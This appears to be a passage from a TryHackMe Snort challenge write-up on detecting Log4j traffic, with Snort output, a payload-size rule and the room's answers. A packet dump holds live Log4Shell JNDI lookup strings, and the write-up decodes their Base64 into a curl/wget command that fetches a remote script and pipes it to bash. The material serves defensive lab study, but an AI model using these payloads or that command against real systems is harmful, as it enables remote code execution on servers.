+    IP6/IP6:            0 (  0.000%)
+        GRE:           90 (  0.196%)
+    GRE Eth:           21 (  0.046%)
+   GRE VLAN:            0 (  0.000%)
+    GRE IP4:           90 (  0.196%)
+    GRE IP6:            0 (  0.000%)
+GRE IP6 Ext:            0 (  0.000%)
+   GRE PPTP:            0 (  0.000%)
+    GRE ARP:            0 (  0.000%)
+    GRE IPX:            0 (  0.000%)
+   GRE Loop:            0 (  0.000%)
+       MPLS:            0 (  0.000%)
+        ARP:            0 (  0.000%)
+        IPX:            0 (  0.000%)
+   Eth Loop:            0 (  0.000%)
+   Eth Disc:            0 (  0.000%)
+   IP4 Disc:            0 (  0.000%)
+   IP6 Disc:            0 (  0.000%)
+   TCP Disc:            0 (  0.000%)
+   UDP Disc:            0 (  0.000%)
+  ICMP Disc:            0 (  0.000%)
+All Discard:            0 (  0.000%)
+      Other:            0 (  0.000%)
+Bad Chk Sum:          174 (  0.379%)
+    Bad TTL:            0 (  0.000%)
+     S5 G 1:            0 (  0.000%)
+     S5 G 2:            0 (  0.000%)
+      Total:        45891
+===============================================================================
+Action Stats:
+     Alerts:           26 (  0.057%)
+     Logged:           26 (  0.057%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            4
+      Alert:            0
+Verdicts:
+      Allow:        45891 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
++-----------------------[filtered events]--------------------------------------
+| gen-id=1      sig-id=21003728   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
+| gen-id=1      sig-id=21003731   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
+| gen-id=1      sig-id=21003730   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
+Snort exiting
+```
+*4*
+Investigate the log/alarm files.
+What are the first six digits of the triggered rule sids?
+Starts with 21
+*210037*
+Clear the previous log and alarm files.
+Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
+What is the number of detected packets?
+The "dsize" option will help you to filter the payload size.
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# nano local-1.rules 
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# cat local-1.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+alert tcp any any <> any any (msg:"Packet size 770 and 855"; dsize:770<>855; sid:1000001;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# sudo snort -c local-1.rules -r log4j.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:           41 (  0.089%)
+     Logged:           41 (  0.089%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:        45891 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*41*
+Investigate the log/alarm files.
+What is the name of the used encoding algorithm?
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# sudo snort -c local-1.rules -r log4j.pcap -A console -dev -l .
+
+WARNING: No preprocessors configured for policy 0.
+12/12-05:06:07.579734  [**] [1:1000001:0] Packet size 770 and 855 [**] [Priority: 0] {TCP} 45.155.205.233:39692 -> 198.71.247.91:80
+12/12-05:06:07.579734 64:9E:F3:BE:DB:66 -> 00:16:3C:F1:FD:6D type:0x800 len:0x349
+45.155.205.233:39692 -> 198.71.247.91:80 TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
+***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
+TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
+47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69 3A 6C  GET /?x=${jndi:l
+64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  dap://45.155.205
+2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
+2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
+4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
+4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
+4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
+4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
+5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
+4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
+4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
+4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
+66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50 2F 31  fGJhc2g=} HTTP/1
+2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E 37 31  .1..Host: 198.71
+2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73 65 72  .247.91:80..User
+2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A 2D 6A  -Agent: ${${::-j
+7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64 7D 24  }${::-n}${::-d}$
+7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D 24 7B  {::-i}:${::-l}${
+3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B 3A 3A  ::-d}${::-a}${::
+2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  -p}://45.155.205
+2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
+2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
+4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
+4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
+4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
+4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
+5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
+4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
+4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
+4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
+66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66 65 72  fGJhc2g=}..Refer
+65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C 6F 77  er: ${jndi:${low
+65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64 7D 24  er:l}${lower:d}$
+7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77 65 72  {lower:a}${lower
+3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  :p}://45.155.205
+2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
+2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
+4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
+4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
+4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
+4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
+5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
+4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
+4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
+4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
+66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63 63 65 70  fGJhc2g=}..Accep
+74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70  t-Encoding: gzip
+0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C  ..Connection: cl
+6F 73 65 0D 0A 0D 0A                             ose....
+
+find jndi cz log4j
+```
+*Base64*
+Investigate the log/alarm files.
+What is the IP ID of the corresponding packet?
+*62808*
+Investigate the log/alarm files.
+Decode the encoded command.
+What is the attacker's command?
+You can use the "base64" tool. Read the log/alarm files and extract the bas64 command. base64 --decode filename.txt
+
+## Exploitation
+```text
+KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3  Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
+
+using cyberchef
+
+(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
+```
+*(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash*
+What is the CVSS v2 score of the Log4j vulnerability?
+https://www.cvedetails.com/cve/CVE-2021-44228/
+```text
+## CVSS Scores & Vulnerability Types
+
+CVSS Score
+
+9.3
+
+Confidentiality Impact
+
+Complete (There is total information disclosure, resulting in all system files being revealed.)
+
+Integrity Impact
+
+Complete (There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)
+
+Availability Impact
+
+Complete (There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)
+
+Access Complexity
+
+Medium (The access conditions are somewhat specialized. Some preconditions must be satistified to exploit)
+
+Authentication
+
+Not required (Authentication is not required to exploit the vulnerability.)
+
+Gained Access
+
+None
+
+Vulnerability Type(s)
+
+Execute Code
+
+CWE ID
+
+[917](https://www.cvedetails.com/cwe-details/917/cwe.html "CWE-917 - CWE definition")
+```
+*9.3*
+### Conclusion
+Congratulations! Are you brave enough to stop a live attack in the Snort2 Challenge 2 room?
+https://tryhackme.com/room/snortchallenges2
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ad8de7609387c81ff8957c777f6aee82.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ce7ed0edba5474a050296b933bc16693.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fb02d4ed1cfa78634f05d3347ec61d94.png)
+
+## Notes / Lessons Learned
+[[Snort]]
+
